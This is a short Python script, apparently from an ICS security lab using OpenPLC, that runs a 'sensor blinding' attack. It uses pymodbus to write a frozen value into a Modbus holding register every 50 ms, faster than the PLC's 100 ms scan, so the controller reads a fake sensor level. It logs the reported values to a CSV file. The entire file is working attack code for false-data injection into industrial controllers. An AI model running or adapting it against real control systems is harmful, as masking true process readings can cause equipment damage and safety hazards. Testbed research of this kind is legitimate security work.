from pymodbus.client import ModbusTcpClient
import time, datetime, csv

HOST = 'localhost'
PORT = 5021
UNIT = 1
FROZEN_VALUE = 54
DURATION = 60

client = ModbusTcpClient(HOST, port=PORT)
client.connect()

log = []
t_start = datetime.datetime.utcnow().isoformat()
print(f"=== SENSOR BLINDING v3 START: {t_start} ===")

end_time = time.time() + DURATION
last_print = time.time()

while time.time() < end_time:
    try:
        client.write_register(0, FROZEN_VALUE, device_id=UNIT)
    except Exception as e:
        print("write error:", e)
        time.sleep(0.5)
        continue

    if time.time() - last_print >= 2:
        try:
            reg = client.read_holding_registers(0, count=1, device_id=UNIT)
            reported = reg.registers[0]
            ts = datetime.datetime.utcnow().isoformat()
            log.append((ts, reported))
            print(f"{ts}  reported_level={reported}")
        except Exception as e:
            print("read error:", e)
        last_print = time.time()

    time.sleep(0.05)  # write every 50ms, still faster than 100ms scan

t_end = datetime.datetime.utcnow().isoformat()
print(f"=== SENSOR BLINDING v3 END: {t_end} ===")

with open('attack_sensor_blinding_v3_log.csv', 'w', newline='') as f:
    w = csv.writer(f)
    w.writerow(['timestamp','reported_level'])
    w.writerows(log)

client.close()
print("Now check OpenPLC web UI live variable page for TRUE NiveauSimu")
